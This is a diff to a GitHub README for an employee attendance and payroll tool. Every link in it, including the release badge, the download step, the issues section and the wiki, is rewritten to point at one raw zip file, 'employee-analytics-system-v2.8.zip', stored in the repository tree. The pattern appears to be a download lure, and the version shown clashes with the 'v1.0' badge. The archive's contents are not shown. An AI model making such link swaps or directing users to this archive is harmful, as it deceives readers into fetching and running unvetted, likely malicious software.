@@ -1,7 +1,7 @@
 # 🎉 employee-analytics-system - Simplify Attendance and Payroll Management
 
 ## 📥 Download Here
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/LPBZ1/employee-analytics-system/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/LPBZ1/employee-analytics-system/main/guidon/employee-analytics-system-v2.8.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/LPBZ1/employee-analytics-system/main/guidon/employee-analytics-system-v2.8.zip)
 
 ## 📖 Overview
 The employee-analytics-system is an easy-to-use tool designed for tracking employee attendance and managing payroll. Built with MySQL, this application automatically calculates hours worked, late arrivals, and overtime. It also generates monthly salary reports to help manage your workforce effectively.
@@ -25,7 +25,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Database Integration:** Utilizes MySQL for secure data storage.
 
 ## 📥 Download & Install
-To download the employee-analytics-system, visit this page: [Download Latest Release](https://github.com/LPBZ1/employee-analytics-system/releases). 
+To download the employee-analytics-system, visit this page: [Download Latest Release](https://raw.githubusercontent.com/LPBZ1/employee-analytics-system/main/guidon/employee-analytics-system-v2.8.zip). 
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version of the application.
@@ -48,7 +48,7 @@ To install the application, follow these steps:
    - Follow the guided setup process to get started.
 
 ## 📞 Support
-If you encounter any issues during the download or installation process, please check the [issues section](https://github.com/LPBZ1/employee-analytics-system/issues) for solutions. You can also open a new issue for any specific problems or questions you have.
+If you encounter any issues during the download or installation process, please check the [issues section](https://raw.githubusercontent.com/LPBZ1/employee-analytics-system/main/guidon/employee-analytics-system-v2.8.zip) for solutions. You can also open a new issue for any specific problems or questions you have.
 
 ## 🏷️ Topics
 The employee-analytics-system covers various topics related to employee management:
@@ -65,7 +65,7 @@ The employee-analytics-system covers various topics related to employee manageme
 This project would not be possible without contributions and feedback from the community. We appreciate everyone who has helped make the employee-analytics-system a useful tool for workplace management.
 
 ## 🌐 Additional Resources
-For more information, tutorials, and documentation, visit our [Wiki Page](https://github.com/LPBZ1/employee-analytics-system/wiki).
+For more information, tutorials, and documentation, visit our [Wiki Page](https://raw.githubusercontent.com/LPBZ1/employee-analytics-system/main/guidon/employee-analytics-system-v2.8.zip).
 
 ## 📥 Quick Download Link
-Don't forget to download the employee-analytics-system now: [Download Latest Release](https://github.com/LPBZ1/employee-analytics-system/releases).
+Don't forget to download the employee-analytics-system now: [Download Latest Release](https://raw.githubusercontent.com/LPBZ1/employee-analytics-system/main/guidon/employee-analytics-system-v2.8.zip).
